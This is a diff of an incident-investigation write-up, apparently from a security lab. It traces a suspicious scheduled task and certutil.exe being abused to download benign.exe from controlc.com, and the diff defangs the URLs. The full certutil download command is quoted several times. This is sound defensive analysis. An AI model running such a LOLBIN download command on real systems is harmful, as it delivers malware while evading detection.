@@ -77,7 +77,7 @@ Visual: New search with the value mentioned above.
 From here I observed that the user Chris.fort from the HR department is running schedulded tasks. Creating a scheduled task to run an executable from a temporary directory (such as AppData\Local\Temp) can be suspicious, as this is a common technique used by malware to maintain persistence on a system. So this could mean that update.exe is an unknown or potentially harmful file.
 
 
-Shifting focus to the first suspicious command line instance, I searched for the value certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe. This revealed that the LOLBIN certutil.exe was used to download a malicious payload from the file-sharing host controlc.com.
+Shifting focus to the first suspicious command line instance, I searched for the value certutil.exe -urlcache -f - https ://controlc.com/e4d11035 benign.exe. This revealed that the LOLBIN certutil.exe was used to download a malicious payload from the file-sharing host controlc.com.
 
 Visual: CommandLine logs and details of the certutil.exe activity.
 
@@ -85,11 +85,11 @@ Visual: CommandLine logs and details of the certutil.exe activity.
 
 Outcome:
 
-- User Haroon used certutil.exe (a LOLBIN) to download a payload from https://controlc.com/e4d11035, indicating the use of a file-sharing service (controlc.com) to deliver the benign.exe malware file.
+- User Haroon used certutil.exe (a LOLBIN) to download a payload from https ://controlc.com/e4d11035, indicating the use of a file-sharing service (controlc.com) to deliver the benign.exe malware file.
  
 Details of the Findings:
 
-- LOLBIN used: certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
+- LOLBIN used: certutil.exe -urlcache -f - https ://controlc.com/e4d11035 benign.exe
   
 - Purpose of certutil.exe: Originally designed for certificate management but abused to download files from the internet.
   
@@ -103,7 +103,7 @@ Infected Host Activity:
 
 - Malicious file downloaded: benign.exe
 
-- URL: https://controlc.com/e4d11035
+- URL: https ://controlc.com/e4d11035
 
 - Date: March 4, 2022
 
